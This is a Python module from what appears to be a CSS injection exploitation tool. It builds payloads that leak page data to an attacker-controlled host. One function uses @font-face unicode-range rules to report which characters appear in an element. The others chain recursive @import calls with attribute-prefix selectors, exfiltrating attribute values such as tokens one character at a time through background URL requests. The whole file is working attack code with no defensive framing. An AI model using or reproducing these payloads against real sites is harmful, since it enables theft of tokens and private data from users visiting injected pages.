import urllib.parse
from cssinj.utils import default


def generate_payload_font_face(hostname, port, attribut, element, client):
    stri = ""
    for char in default.PRINTABLE:
        stri += f'@font-face {{font-family:e;src:url("//{hostname}:{port}/valid?cid={client.id}&t={urllib.parse.quote_plus(char)}");unicode-range: U+{ord(char):04X};}}'
    stri += f"{element}{'.'+attribut if attribut else ''} {{font-family:e;}}"

    return stri


def generate_payload_recursive_import(hostname, port, attribut, element, client):
    stri = generate_next_import(hostname=hostname, port=port, client=client)

    elements_attributs = []
    for client_element in client.elements:
        for element_attribut in client_element.attributs:
            if element_attribut.name == attribut:
                elements_attributs.append(element_attribut)

    # Check if the token is complete
    stri += f"html:has({element}[{attribut}={repr(client.data)}]"
    stri += f"{"".join([f":not({element}[{attribut}={repr(elements_attribut.value)}])" for elements_attribut in elements_attributs])})"
    stri += f"{"".join([":first-child" for i in range(client.counter)])}"
    stri += f'{{background: url("//{hostname}:{port}/end?n={client.counter}&cid={client.id}");}}'

    # Payload to extract the token
    stri += "".join(
        map(
            lambda x: f"html:has({element}[{attribut}^={repr(client.data+x)}]"
            f'{"".join([f":not({element}[{attribut}={repr(elements_attribut.value)}])" for elements_attribut in elements_attributs])})'
            f'{"".join([":first-child" for i in range(client.counter)])}'
            f'{{background: url("//{hostname}:{port}/valid?t={urllib.parse.quote_plus(client.data+x)}&cid={client.id}");}}',
            default.PRINTABLE,
        )
    )

    return stri


def generate_next_import(hostname, port, client):
    return (
        f"@import url('//{hostname}:{port}/next?n={client.counter}&cid={client.id}');"
    )
